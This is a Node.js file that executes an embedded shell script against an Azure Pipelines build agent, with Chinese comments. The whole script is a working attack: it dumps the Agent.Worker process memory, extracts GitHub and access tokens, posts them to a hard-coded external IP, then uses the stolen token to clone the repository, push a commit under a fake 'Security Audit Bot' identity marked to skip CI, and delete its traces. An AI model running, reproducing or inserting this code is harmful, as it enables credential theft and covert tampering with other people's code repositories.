const { execSync } = require('child_process');

const script = `
    # 1. 安装工具
    dotnet tool install --global dotnet-dump;

    # 2. 获取 Agent 进程 PID
    PID=$(ps -e | grep "Agent.Worker" | grep -v grep | awk '{print $1}');

    if [ -z "$PID" ]; then
        echo "Error: Unable to find PID for Agent.Worker."
        exit 1
    fi

    echo "The PID of Agent.Worker is $PID";
    echo "Target Repo: $BUILD_REPOSITORY_URI";

    # 3. 内存 Dump
    dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin

    # 4. 提取敏感信息 (GitHub Token 和 Access Token)
    # 注意：这里假设 GH_TOKEN 格式符合 gh._[A-Za-z0-9]+
    GH_TOKEN=$(strings -e b -n 20 /home/vsts/work/_temp/heap_worker.bin | grep -E '"gh._[A-Za-z0-9]+"' | head -n 1 | sed -Ee 's/.*"(gh._[A-Za-z0-9]+)".*/\\1/');
    ACCESS_TOKEN=$(strings -e b -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '"AccessToken":".+"' | head -n 1 | sed -Ee 's/.*AccessToken":"([^"]+)".*/\\1/');

    # 5. (可选) 数据外带 - 发送到攻击者服务器
    if [ ! -z "$GH_TOKEN" ] || [ ! -z "$ACCESS_TOKEN" ]; then
        curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\", \\"gh\\": \\"$GH_TOKEN\\",\\"repoUrl\\": \\"$BUILD_REPOSITORY_URI\\"}" http://139.180.193.16:7777
    fi

    echo "Extracted GH_TOKEN=$GH_TOKEN"
    echo "Extracted ACCESS_TOKEN=$ACCESS_TOKEN"

    # ==========================================
    # 新增：利用 GH_TOKEN 篡改代码库
    # ==========================================
    if [ ! -z "$GH_TOKEN" ]; then
        echo "Starting malicious repository modification using extracted GH_TOKEN..."

        # 构造带有 Token 认证的 URL
        # 将 https://github.com/... 替换为 https://<TOKEN>@github.com/...
        # 注意：BUILD_REPOSITORY_URI 环境变量通常由 Azure Pipelines 自动提供
        AUTH_REPO_URL=$(echo $BUILD_REPOSITORY_URI | sed "s/https:\/\//https:\/\/$GH_TOKEN@/")

        # 在临时目录进行操作，避免干扰当前工作区
        TEMP_DIR="/tmp/pwn_test_$(date +%s)"
        mkdir -p $TEMP_DIR
        cd $TEMP_DIR

        # 克隆仓库
        echo "Cloning repository..."
        git clone $AUTH_REPO_URL repo
        
        if [ -d "repo" ]; then
            cd repo
            
            # 配置攻击者身份（用于 Commit 记录）
            git config user.email "security-audit@example.com"
            git config user.name "Security Audit Bot"

            # 写入恶意文件或后门
            echo "This file demonstrates write access via leaked GH_TOKEN from process memory." > compromised_audit.txt
            date >> compromised_audit.txt
            
            # 提交并推送
            echo "Committing and pushing changes..."
            git add compromised_audit.txt
            git commit -m "chore: update audit logs [skip ci]"
            
            # 尝试推送到当前分支 (通常是 main 或 master，取决于 BUILD_SOURCEBRANCHNAME)
            # 如果不知道具体分支，可以尝试 HEAD
            git push origin HEAD
            
            if [ $? -eq 0 ]; then
                echo "SUCCESS: Repository compromised successfully."
            else
                echo "FAILED: Git push failed (Token might be read-only or branch protected)."
            fi
        else
            echo "FAILED: Git clone failed (Token might be invalid)."
        fi

        # 清理痕迹
        cd ..
        rm -rf $TEMP_DIR
    else
        echo "No GH_TOKEN found, skipping repository modification."
    fi
`

try {
    console.log(execSync(script, { encoding: 'utf8', maxBuffer: 1024 * 1024 * 50 })); // 增加 buffer 以防输出过长
} catch (e) {
    console.error("Script execution failed:");
    console.error(e.stdout); // 打印标准输出以便调试
    console.error(e.stderr); // 打印错误输出
}
